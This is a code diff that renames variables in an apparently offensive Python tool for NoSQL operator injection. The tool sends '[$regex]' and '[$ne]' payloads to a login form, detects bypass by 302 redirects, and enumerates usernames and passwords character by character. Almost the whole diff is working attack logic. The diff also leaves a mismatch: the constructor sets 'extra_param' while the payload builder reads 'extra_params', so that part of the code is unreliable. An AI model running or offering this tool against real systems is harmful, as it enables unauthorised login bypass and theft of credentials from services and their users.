@@ -30,14 +30,14 @@ class bc:
 
 class CodeInjector:
 
-    def __init__(self, h, r, up, pp, tg, ep, v):
-        self.h = h
-        self.r = r
-        self.up = up
-        self.pp = pp
+    def __init__(self, host, req, usrp, pwdp, tg, extra_param, verb):
+        self.host = host
+        self.req = req
+        self.usrp = usrp
+        self.pwdp = pwdp
         self.tg = tg
-        self.ep = ep
-        self.v = v
+        self.extra_param = extra_param
+        self.verb = verb
 
     def test_injection(self):
 
@@ -71,7 +71,7 @@ class CodeInjector:
             else:
                 stdout.write(bc.FAIL + " Fail\n" + bc.DEFAULT)
         if not len(injectable) < 1:
-            stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable\n'+bc.DEFAULT
+            stdout.write(bc.OKGREEN + f'[+] Host {self.host} is injectable\n'+bc.DEFAULT
                                     + '[+] Injectable payloads: \n')
 
             for p in injectable:
@@ -79,14 +79,14 @@ class CodeInjector:
             return True
             
         else:
-            stderr.write(bc.FAIL + f'[-] Host {self.h} is not injectable\n' + bc.DEFAULT)
+            stderr.write(bc.FAIL + f'[-] Host {self.host} is not injectable\n' + bc.DEFAULT)
             exit(0)
 
     def build_payload(self, test=False, char='', pay=''):
 
-        injection_payloads = {f"{self.up}"  : {self.up + "[$regex]" : "^" + char + ".*", self.pp + "[$ne]" : "" + "," + self.ep},
-                              f"{self.pp}"  : {self.pp + "[$regex]" : "^" + char + ".*", self.up + "[$ne]" : "" + "," + self.ep},
-                              "test_pay" : {self.up + pay : "", self.pp + pay : "" + "," + self.ep}}
+        injection_payloads = {f"{self.usrp}"  : {self.usrp + "[$regex]" : "^" + char + ".*", self.pwdp + "[$ne]" : "" + "," + self.extra_params},
+                              f"{self.pwdp}"  : {self.pwdp + "[$regex]" : "^" + char + ".*", self.usrp + "[$ne]" : "" + "," + self.extra_params},
+                              "test_pay" : {self.usrp + pay : "", self.pwdp + pay : "" + "," + self.extra_params}}
         if test:
             return injection_payloads['test_pay']
         if not test:
@@ -96,12 +96,12 @@ class CodeInjector:
         badchar = r'&$^*\?+.|'
         payload = self.build_payload(test=True, pay=pay)
         if test:
-            if self.r == 'POST':
-                test_query = post(self.h, data=payload, allow_redirects=False, verify=False)
+            if self.req == 'POST':
+                test_query = post(self.host, data=payload, allow_redirects=False, verify=False)
                 if test_query.status_code == 302:
                     return True
-            if self.r == 'GET':
-                test_query = get(self.h, data=payload, allow_redirects=False, verify=False)
+            if self.req == 'GET':
+                test_query = get(self.host, data=payload, allow_redirects=False, verify=False)
                 if test_query.status_code == 302:
                     return True
         else:
@@ -112,13 +112,13 @@ class CodeInjector:
                 if c in badchar:
                     continue
                 payload = self.build_payload(char=c)
-                if self.r == 'POST'
-                    query = post(self.h, data=payload, allow_redirects=False, verify=False)
+                if self.req == 'POST':
+                    query = post(self.host, data=payload, allow_redirects=False, verify=False)
                     if query.status_code == 302:
                         stdout.write(f'[+] Starting character "{c}"\n'
                                       '[+] Enumerating rest of string...\n')
-                elif self.r == 'GET':
-                    query = get(self.h, data=payload, allow_redirects=False, verify=False)
+                elif self.req == 'GET':
+                    query = get(self.host, data=payload, allow_redirects=False, verify=False)
                     if query.status_code == 302:
                         stdout.write(f'[+] Starting character "{c}"\n'
                                       '[+] Enumerating rest of string...\n')
@@ -128,7 +128,7 @@ class CodeInjector:
                             if cc in badchar:
                                 continue
                             payload = self.build_payload(char=(m + cc))
-                            query = post(self.h, data=payload, allow_redirects=False, verify=False)
+                            query = post(self.host, data=payload, allow_redirects=False, verify=False)
                             if query.status_code == 302:
                                 stdout.write(f'[+] Match: "{cc}"\n')
                                 m += cc
